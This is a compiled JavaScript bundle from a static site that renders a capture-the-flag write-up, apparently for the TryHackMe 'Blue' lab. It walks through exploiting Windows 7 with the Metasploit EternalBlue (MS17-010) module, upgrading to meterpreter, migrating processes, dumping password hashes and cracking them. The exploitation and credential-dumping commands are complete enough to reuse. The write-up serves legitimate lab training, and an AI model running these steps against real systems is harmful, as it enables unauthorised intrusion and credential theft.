(window.webpackJsonp=window.webpackJsonp||[]).push([[100],{441:function(s,a,e){"use strict";e.r(a);var t=e(13),n=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"blue"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#blue"}},[s._v("#")]),s._v(" Blue")]),s._v(" "),a("h2",{attrs:{id:"initial-recon"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#initial-recon"}},[s._v("#")]),s._v(" Initial recon")]),s._v(" "),a("p",[s._v("First, scan the host")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("nmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-T5")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])]),a("p",[s._v("The main expoloitable service found was the "),a("code",[s._v("windows 7 professional 7601 Service pack 1")])]),s._v(" "),a("p",[s._v("Related to Eternalblue "),a("code",[s._v("MS17-010")])]),s._v(" "),a("p",[s._v("Now lets run the metasploit console")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" postgresql start\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nshow targets\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" TARGET "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nshow options\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rhosts "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\nexploit\n")])])]),a("p",[s._v("Now we have a shell inside the windows machine. Let's look for the flag.")]),s._v(" "),a("p",[s._v("A flag was found inside the documents folder for a person named "),a("code",[s._v("Jon")])]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("C:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Users"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Jon"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Documents\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("type")]),s._v(" flag3.txt\n")])])]),a("h2",{attrs:{id:"followup-recon"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#followup-recon"}},[s._v("#")]),s._v(" Followup Recon")]),s._v(" "),a("p",[s._v("Let's upgrade the "),a("strong",[s._v("shell")]),s._v(" to a "),a("strong",[s._v("meterpreter")]),s._v(".")]),s._v(" "),a("p",[s._v("First, background the current shell "),a("code",[s._v("CTRL + Z")])]),s._v(" "),a("p",[s._v("There are 2 ways to do this,")]),s._v(" "),a("ol",[a("li",[a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("sessions\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# should list out sessions here")]),s._v("\nsessions "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# stands for upgrade session 1")]),s._v("\nsessions "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# connect to the new meterpreter session")]),s._v("\n")])])])]),s._v(" "),a("li",[a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("use post/multi/manage/shell_to_meterpreter\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" session "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("shell_session_ID"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\nexploit\nsessions "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("shell_session_ID"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])])])]),s._v(" "),a("p",[s._v("Now lets see who I am")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("shell\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v("\n")])])]),a("p",[s._v("looking at the processes running on the machine and migrating to it")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ps")]),s._v("\nmigrate "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("process_id"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])]),a("p",[s._v("Once migrating over to a new process, lets take a look at the hashes")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("hashdump\n")])])]),a("p",[s._v("Now lets crack them, first background the meterpreter")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("use post/windows/gather/hashdump\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" session "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("session_id"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\nrun\n")])])]),a("p",[s._v("Lets check what creds looks like")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("creds "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# make sure it outputs the hashdump that it found")]),s._v("\n")])])]),a("p",[a("img",{attrs:{src:"/images/ctf/tryhackme/blue/creds_example.PNG",alt:"image"}})]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("use auxiliary/analyze/jtr_windows_fast\nrun\n")])])]),a("p",[s._v("submit the flags and now we are done!")])])}),[],!1,null,null,null);a.default=n.exports}}]);